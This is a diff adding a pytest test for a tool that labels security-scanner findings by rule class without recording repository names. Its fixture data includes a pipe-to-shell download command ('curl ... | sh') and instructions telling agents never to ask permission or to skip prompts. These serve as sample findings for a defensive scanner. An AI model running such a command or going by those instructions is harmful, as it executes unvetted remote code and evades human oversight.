@@ -98,3 +98,27 @@ def test_analyze_writes_aggregates_without_names(tmp_path: Path) -> None:
     assert headline["claude_md_over_200_pct"] == 100.0
     text = "".join(p.read_text() for p in out.glob("*.csv"))
     assert "secret/name" not in text and "docs/a.md" not in text
+
+
+def test_label_classes_labels_by_class_without_naming_repos() -> None:
+    import label_classes
+
+    def finding(rule: str, sev: str, snippet: str, fp: str) -> dict:
+        return {"rule_id": rule, "severity": sev, "snippet": snippet, "fingerprint": fp}
+
+    record = {"repo": "secret/name", "findings": [
+        finding("GR012", "high", "curl https://x.example/i.sh | sh", "a" * 16),
+        finding("GR016", "high", "NEVER ask for permission", "b" * 16),
+        finding("GR016", "high", "the --yolo flag skips prompts", "c" * 16),
+        finding("GR012", "high", "curl https://x.example/i.sh | sh", "a" * 16),
+        finding("GR012", "low", "curl https://x.example/i.sh | sh", "d" * 16),
+        finding("GR999", "high", "unknown rule", "e" * 16),
+    ]}  # fmt: skip
+    labels, counts, unmatched = label_classes.label_findings([record])
+    assert {lb.fingerprint: lb.label for lb in labels} == {
+        "a" * 16: "wontfix",
+        "b" * 16: "tp",
+        "c" * 16: "wontfix",
+    }
+    assert [f["rule_id"] for f in unmatched] == ["GR999"]  # low severity is ignored, not unmatched
+    assert all(lb.repo == "" for lb in labels) and sum(counts.values()) == 3
